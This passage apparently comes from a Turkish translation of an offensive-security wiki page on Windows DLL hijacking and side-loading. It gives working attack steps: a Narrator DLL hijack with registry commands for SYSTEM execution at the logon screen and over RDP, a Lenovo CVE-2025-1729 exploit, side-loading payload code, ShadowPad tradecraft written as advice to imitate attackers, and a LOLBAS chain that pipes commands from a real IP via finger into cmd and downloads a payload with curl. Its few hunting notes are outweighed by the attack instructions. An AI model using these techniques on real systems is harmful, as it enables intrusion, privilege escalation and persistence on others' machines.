switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe, başlangıçta tahmin edilebilir, dile özgü bir localization DLL dosyasını hâlâ arar; bu dosya arbitrary code execution ve persistence için hijack edilebilir.<sup>[[7]](#references)</sup>

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- OneCore path üzerinde writable attacker-controlled bir DLL mevcutsa yüklenir ve `DllMain(DLL_PROCESS_ATTACH)` çalıştırılır. Herhangi bir export gerekmez.

Discovery with Procmon
- Filter: `Process Name is Narrator.exe` ve `Operation is Load Image` veya `CreateFile`.
- Narrator'ı başlatın ve yukarıdaki path'e yönelik yükleme girişimini gözlemleyin.

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC sessizliği
- Naive bir hijack, UI üzerinde konuşur/vurgulama yapar. Sessiz kalmak için attach sırasında Narrator thread'lerini enumerate edin, ana thread'i (`OpenThread(THREAD_SUSPEND_RESUME)`) açın ve `SuspendThread` ile askıya alın; kendi thread'inizde devam edin. Tam kod için PoC'ye bakın.<sup>[[8]](#references)</sup>

Accessibility configuration üzerinden tetikleme ve persistence
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Yukarıdakilerle Narrator başlatıldığında planted DLL yüklenir. Secure desktop'ta (logon screen) Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın; DLL'iniz secure desktop üzerinde SYSTEM olarak çalışır.

RDP-triggered SYSTEM execution (lateral movement)
- Classic RDP security layer'a izin verin: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Host'a RDP ile bağlanın, logon screen'de Narrator'ı başlatmak için CTRL+WIN+ENTER tuşlarına basın; DLL'iniz secure desktop üzerinde SYSTEM olarak çalışır.
- Execution, RDP session kapatıldığında durur—hızlıca inject/migrate edin.

Bring Your Own Accessibility (BYOA)
- Yerleşik bir Accessibility Tool (AT) registry entry'sini (ör. CursorIndicator) clone edebilir, bunu arbitrary bir binary/DLL'e işaret edecek şekilde düzenleyebilir, import edebilir ve ardından `configuration` değerini bu AT name olarak ayarlayabilirsiniz. Bu yöntem, Accessibility framework altında arbitrary execution için proxy görevi görür.

Notlar
- `%windir%\System32` altına yazmak ve HKLM değerlerini değiştirmek admin rights gerektirir.
- Tüm payload logic'i `DLL_PROCESS_ATTACH` içinde bulunabilir; export gerekmez.

## Case Study: CVE-2025-1729 - TPQMAssistant.exe Kullanılarak Privilege Escalation

Bu case, Lenovo'nun TrackPoint Quick Menu'sundaki (`TPQMAssistant.exe`) **Phantom DLL Hijacking** durumunu gösterir ve **CVE-2025-1729** olarak takip edilir.<sup>[[2]](#references)[[3]](#references)</sup>

### Vulnerability Details

- **Component**: `C:\ProgramData\Lenovo\TPQM\Assistant\` konumunda bulunan `TPQMAssistant.exe`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask`, her gün 09:30'da logon olan user context'i altında çalışır.
- **Directory Permissions**: `CREATOR OWNER` tarafından yazılabilir durumdadır; bu da local user'ların arbitrary file bırakmasına olanak tanır.
- **DLL Search Behavior**: Önce working directory'den `hostfxr.dll` yüklemeyi dener ve eksikse "NAME NOT FOUND" log'lar; bu durum local directory search precedence'i gösterir.

### Exploit Implementation

Bir attacker, aynı directory içine malicious bir `hostfxr.dll` stub'ı yerleştirerek missing DLL'den yararlanabilir ve user context'i altında code execution elde edebilir:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Saldırı Akışı

1. Standart bir kullanıcı olarak `hostfxr.dll` dosyasını `C:\ProgramData\Lenovo\TPQM\Assistant\` dizinine bırakın.
2. Scheduled task'ın mevcut kullanıcının context'i altında 09:30'da çalışmasını bekleyin.
3. Task çalıştığında bir administrator oturum açmış durumdaysa, malicious DLL administrator'ın session'ında medium integrity ile çalışır.
4. Medium integrity'den SYSTEM privileges seviyesine yükselmek için standart UAC bypass tekniklerini zincirleyin.

## Vaka Çalışması: MSI CustomAction Dropper + Signed Host (wsc_proxy.exe) üzerinden DLL Side-Loading

Threat actor'lar payload'ları trusted ve signed bir process altında çalıştırmak için sıklıkla MSI-based dropper'ları DLL side-loading ile birlikte kullanır.<sup>[[10]](#references)</sup>

Zincir özeti
- User, MSI'ı indirir. Bir CustomAction, GUI install sırasında sessizce çalışır (ör. LaunchApplication veya bir VBScript action) ve embedded resource'lar içinden next stage'i yeniden oluşturur.
- Dropper, legitimate ve signed bir EXE ile malicious bir DLL'i aynı directory'ye yazar (örnek pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Signed EXE başlatıldığında Windows DLL search order, wsc.dll'i önce working directory'den yükler ve attacker code'un signed bir parent altında çalışmasını sağlar (ATT&CK T1574.001).

MSI analizi (aranması gerekenler)
- CustomAction table:
- Executable'ları veya VBScript'leri çalıştıran entry'leri arayın. Şüpheli pattern örneği: background'da embedded bir file çalıştıran LaunchApplication.
- Orca'da (Microsoft Orca.exe) CustomAction, InstallExecuteSequence ve Binary table'larını inceleyin.
- MSI CAB içindeki embedded/split payload'lar:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Ya da lessmsi kullanın: lessmsi x package.msi C:\out
- Bir VBScript CustomAction tarafından birleştirilen ve decrypt edilen birden fazla küçük fragment arayın. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Practical sideloading with wsc_proxy.exe
- Bu iki dosyayı aynı klasöre bırakın:
- wsc_proxy.exe: meşru imzalı host (Avast). İşlem, wsc.dll dosyasını adıyla kendi dizininden yüklemeye çalışır.
- wsc.dll: saldırgan DLL'i. Belirli export'lar gerekmiyorsa DllMain yeterli olabilir; aksi takdirde bir proxy DLL oluşturun ve payload'u DllMain içinde çalıştırırken gerekli export'ları gerçek library'ye forward edin.
- Minimal bir DLL payload'u oluşturun:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Export gereksinimleri için, payload'unuzu da çalıştıran bir forwarding DLL oluşturmak üzere bir proxying framework (ör. DLLirant/Spartacus) kullanın.

- Bu technique, DLL name resolution işleminin host binary tarafından yapılmasına dayanır. Host absolute paths veya safe loading flags (ör. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories) kullanıyorsa hijack başarısız olabilir.
- KnownDLLs, SxS ve forwarded exports öncelik sırasını etkileyebilir; host binary ve export set seçimi sırasında bunlar göz önünde bulundurulmalıdır.

## Signed triads + encrypted payloads (ShadowPad case study)

Check Point, Ink Dragon'un diskteki core payload'u encrypted tutarken legitimate software ile uyum sağlamak için ShadowPad'i **three-file triad** kullanarak nasıl deploy ettiğini açıkladı:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – AMD, Realtek veya NVIDIA gibi vendor'lar kötüye kullanılır (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Saldırganlar executable'ı bir Windows binary'si gibi görünecek şekilde yeniden adlandırır (örneğin `conhost.exe`); ancak Authenticode signature geçerliliğini korur.
2. **Malicious loader DLL** – beklenen adla (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`) EXE'nin yanına bırakılır. DLL genellikle ScatterBrain framework ile obfuscated edilmiş bir MFC binary'sidir; tek görevi encrypted blob'u bulmak, decrypt etmek ve ShadowPad'i reflectively map etmektir.
3. **Encrypted payload blob** – çoğunlukla aynı directory içinde `<name>.tmp` olarak saklanır. Loader, decrypted payload'u memory-map ettikten sonra forensic evidence'ı yok etmek için TMP file'ı siler.

Tradecraft notları:

* Signed EXE'yi yeniden adlandırmak (PE header içindeki orijinal `OriginalFileName` korunurken), Windows binary'si gibi görünmesini ve vendor signature'ını korumasını sağlar; bu nedenle Ink Dragon'un gerçekte AMD/NVIDIA utilities olan `conhost.exe` görünümlü binary'leri bırakma alışkanlığını taklit edin.
* Executable trusted kaldığından, allowlisting controls'ün çoğu yalnızca malicious DLL'in yanında bulunmasını gerektirir. Loader DLL'i özelleştirmeye odaklanın; signed parent genellikle değiştirilmeden çalıştırılabilir.
* ShadowPad decryptor, TMP blob'un loader'ın yanında bulunmasını ve mapping sonrasında file'ı sıfırlayabilmek için writable olmasını bekler. Payload yüklenene kadar directory'yi writable tutun; belleğe alındıktan sonra TMP file OPSEC amacıyla güvenle silinebilir.

### LOLBAS stager + staged archive sideloading chain (finger → tar/curl → WMI)

Operators, diskteki tek custom artifact'ın trusted EXE'nin yanındaki malicious DLL olması için DLL sideloading'i LOLBAS ile birleştirir:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Hidden PowerShell, `cmd.exe /c` başlatır, Finger server'dan commands çeker ve bunları `cmd`'ye pipe eder:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host`, TCP/79 text çeker; `| cmd` server response'u execute eder ve operators'ın second stage'i server-side rotate etmesini sağlar.

- **Built-in download/extract:** Benign bir extension'a sahip archive'ı download edin, unpack edin ve sideload target ile DLL'i random bir `%LocalAppData%` folder altında stage edin:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` progress'i gizler ve redirects'leri takip eder; `tar -xf`, Windows'un built-in tar'ını kullanır.

- **WMI/CIM launch:** EXE'yi WMI üzerinden başlatın; böylece telemetry, colocated DLL'i yüklerken CIM-created process gösterir:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Local DLL'leri tercih eden binary'lerle çalışır (ör. `intelbq.exe`, `nearby_share.exe`); payload (ör. Remcos) trusted name altında çalışır.

- **Hunting:** `/p`, `/m` ve `/c` birlikte göründüğünde `forfiles` için alert oluşturun; admin scripts dışında bu kullanım yaygın değildir.


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Yakın tarihli bir Lotus Blossom intrusion, NSIS-packed dropper deliver etmek ve DLL sideloading ile tamamen in-memory payload'ları stage etmek için trusted update chain'i kötüye kullandı.<sup>[[13]](#references)</sup>

Tradecraft flow
- `update.exe` (NSIS), `%AppData%\Bluetooth` oluşturur, bunu **HIDDEN** olarak işaretler, yeniden adlandırılmış Bitdefender Submission Wizard `BluetoothService.exe`, malicious `log.dll` ve encrypted blob `BluetoothService` bırakır; ardından EXE'yi başlatır.
- Host EXE, `log.dll` import eder ve `LogInit`/`LogWrite` çağırır. `LogInit` blob'u mmap-load eder; `LogWrite` bunu custom LCG-based stream ile decrypt eder (constants **0x19660D** / **0x3C6EF35F**, key material önceki bir hash'ten türetilir), buffer'ı plaintext shellcode ile overwrite eder, temp'leri free eder ve buna jump eder.
- IAT kullanmamak için loader, export names'leri **FNV-1a basis 0x811C9DC5 + prime 0x100019** kullanarak hash'ler; ardından Murmur-style avalanche (**0x85EBCA6B**) uygular ve salted target hashes ile karşılaştırır.

Main shellcode (Chrysalis)
- Beş pass boyunca `gQ2JR&9;` key'iyle tekrarlanan add/XOR/sub işlemleri kullanarak PE-like main module'ü decrypt eder; ardından import resolution'ı tamamlamak için `Kernel32.dll` → `GetProcAddress` dynamically load eder.
- DLL name strings'leri runtime'da per-character bit-rotate/XOR transforms ile yeniden oluşturur; ardından `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32` yükler.
- İkinci resolver, **PEB → InMemoryOrderModuleList** üzerinden ilerler, her export table'ı Murmur-style mixing ile 4-byte blocks halinde parse eder ve yalnızca hash bulunamazsa `GetProcAddress`'e fallback yapar.

Embedded configuration & C2
- Config, dropped `BluetoothService` file içinde **offset 0x30808**'de (**size 0x980**) bulunur ve `qwhvb^435h&*7` key'iyle RC4-decrypt edilir; böylece C2 URL'si ve User-Agent ortaya çıkar.
- Beacons, dot-delimited host profile oluşturur, başına `4Q` tag'ini ekler ve HTTPS üzerinden `HttpSendRequestA` öncesinde `vAuig34%^325hGV` key'iyle RC4-encrypt eder. Responses RC4-decrypt edilir ve tag switch ile dispatch edilir (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + chunked transfer cases).
- Execution mode CLI args ile kontrol edilir: args yoksa `-i`'yi işaret eden persistence (service/Run key) install eder; `-i` kendisini `-k` ile yeniden başlatır; `-k` install'ı atlar ve payload'u çalıştırır.

Alternate loader observed
- Aynı intrusion, Tiny C Compiler'ı bıraktı ve `C:\ProgramData\USOShared\` içinden `svchost.exe -nostdlib -run conf.c` çalıştırdı; yanında `libtcc.dll` bulunuyordu. Saldırgan tarafından sağlanan C source shellcode içeriyor, compile ediliyor ve PE'yi diske yazmadan in-memory çalıştırılıyordu. Şununla replicate edin:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- TCC tabanlı bu derleme ve çalıştırma aşaması, `Wininet.dll` dosyasını çalışma zamanında içe aktardı ve sabit kodlanmış bir URL'den ikinci aşama shellcode'u çekti; böylece derleyici çalıştırması gibi görünen esnek bir loader elde edildi.

## Export proxying + host thread parking ile imzalı host sideloading

Bazı DLL sideloading zincirleri, meşru host'un kötü amaçlı DLL yüklendikten sonra çökmesi yerine sonraki aşamaları düzgün şekilde yükleyecek kadar uzun süre çalışır durumda kalmasını sağlamak için **stability engineering** teknikleri ekler.<sup>[[11]](#references)</sup>

Gözlemlenen örüntü
- Beklenen `version.dll` gibi dependency adıyla güvenilir bir EXE'yi kötü amaçlı bir DLL'nin yanına bırakın.
- Kötü amaçlı DLL, import resolution işleminin başarılı olması ve host process'in çalışmaya devam etmesi için beklenen tüm export'ları gerçek system DLL'ye (örneğin `%SystemRoot%\\System32\\version.dll`) **proxy'ler**.
- Yüklendikten sonra kötü amaçlı DLL, ana thread'in process'ten çıkmak veya process'i sonlandıracak code path'lerini çalıştırmak yerine sonsuz bir `Sleep` döngüsüne girmesi için **host entry point'ini patch'ler**.
- Yeni bir thread gerçek kötü amaçlı çalışmayı gerçekleştirir: sonraki aşama DLL'sinin adını veya path'ini decrypt eder (RC4/XOR yaygındır), ardından `LoadLibrary` ile başlatır.

Bunun önemi
- Normal DLL proxying API uyumluluğunu korur, ancak host'un sonraki aşamaların çalışması için yeterince uzun süre hayatta kalacağını garanti etmez.
- Ana thread'i `Sleep(INFINITE)` ile park etmek, loader başka bir worker thread'de decryption, staging veya network bootstrap gerçekleştirirken imzalı process'i bellekte tutmanın basit bir yoludur.
- Yalnızca şüpheli bir `DllMain` aramak, ilginç davranış host entry point'i patch'lendikten ve ikincil bir thread başlatıldıktan sonra gerçekleşiyorsa bu örüntüyü gözden kaçırabilir.

Minimum workflow
1. İmzalı host EXE'yi kopyalayın ve local directory'den resolve ettiği DLL'yi belirleyin.
2. Aynı function'ları export eden ve bunları meşru DLL'ye forwarding yapan bir proxy DLL oluşturun.
3. `DllMain(DLL_PROCESS_ATTACH)` içinde bir worker thread oluşturun.
4. Bu thread'den host entry point'ini veya main thread start routine'ini patch'leyerek `Sleep` üzerinde döngüye girmesini sağlayın.
5. Sonraki aşama DLL'sinin adını/config bilgisini decrypt edin ve `LoadLibrary` çağırın veya payload'u manual-map edin.

Defensive pivots
- `version.dll` veya benzer yaygın library'leri `System32` yerine kendi application directory'lerinden yükleyen signed process'ler.
- Image load işleminden kısa süre sonra process entry point'inde yapılan memory patch'leri; özellikle `Sleep`/`SleepEx` işlevlerine yönlendirilen jump/call'lar.
- Bir proxy DLL tarafından oluşturulan ve decrypted bir adla ikinci bir DLL üzerinde hemen `LoadLibrary` çağıran thread'ler.
- `ProgramData`, `%TEMP%` veya unpack edilmiş archive path'leri gibi writable staging directory'lerinde vendor executable'larının yanına yerleştirilmiş full-export proxy DLL'leri.

## References

- [1] [Red Canary – Intelligence Insights: January 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe Kullanılarak Privilege Escalation](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows'ta DLL hijacking. Basit C örneği.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore Avrupa'yı Hedefleyen Yeni Malware Deploy Ediyor](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijack'leri Windows Helper'larıyla Buluştuğunda](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Digital Doppelgangers: Gh0st RAT Dağıtan Gelişen Impersonation Campaigns'in Anatomisi](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Converging Interests: Güneydoğu Asya'daki Bir Hükümeti Hedefleyen Threat Cluster'ların Analizi](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Inside Ink Dragon: Relay Network'ün ve Gizli Bir Offensive Operation'ın İç İşleyişinin Ortaya Çıkarılması](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – The Chrysalis Backdoor: Lotus Blossom'un toolkit'ine Derinlemesine Bakış](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack zinciri](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Iranian APT Screening Serpens'in 2026 Espionage Campaign'lerini İzleme](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` elementi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` elementi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` elementi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` elementi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` elementi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` elementi](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: İran Conflict Sırasında Nimbus Manticore Operations](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062, Güneydoğu Asya Hükümetlerini ve Critical Infrastructure'ı Hedefliyor](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)

{{#include ../../../banners/hacktricks-training.md}}
